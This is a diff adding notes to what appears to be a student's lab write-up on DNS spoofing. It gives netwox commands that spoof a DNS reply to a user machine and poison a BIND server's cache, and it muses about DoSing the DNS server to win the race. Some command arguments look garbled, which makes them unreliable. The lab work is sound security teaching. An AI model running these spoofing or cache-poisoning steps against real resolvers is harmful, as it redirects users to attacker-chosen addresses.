@@ -96,3 +96,23 @@ http://networkengineering.stackexchange.com/questions/30105/using-wireshark-to-c
 
 Need to select All VMs in the Promiscuous mode of the network adapter.
 
+Now, let's try to spoof response to the user. The goal is to let the user believe that 74.125.29.147 (www.google.com) is the address of www.example.com.
+
+http://www.cis.syr.edu/~wedu/Teaching/cis758/netw522/netwox-doc_html/tools/105.html
+
+This is the current command I use:
+
+    sudo netwox 105 -h "www.example.com" -H "74.5.29.147" -a "ns.example.com" -A "74.125.29.147" -f "src host 10.0.2.7"
+
+In wireshark, I see that the spoofed answer has been sent out, but it always arrives a little bit late than the authenticate response. The spoofing works roughly once in 10 trials. **Q:** How to make the spoofed response arrive faster? DoS the DNS server? But if the DoS comes from the attacker machine, it more or less slows down the spoofing pacakge as well. So probably need another machine. It also kind of similar to use-after-free exploit.
+
+Task 3:
+
+We now try to spoof the DNS server. This will result in a DNS cache poisoning. We want to let the DNS server to associate Google's IP address with www.psu.edu
+
+    sudo netwox 105 -h "www.expsu.edu" -H "74.1229.147" -a "ns.psu.edu" -A "74.125.29.147" -f "src host 10.0.2.4" -s "raw" -T 600
+
+It works. On the user machine, open Firefox and type in www.psu.edu, we saw the 404 page of Google. We further use rndc to verify that the cache is indeed poisoned:
+
+    sudo rndc dumpdb -cache
+    sudo cat /var/cache/bind/dump.db
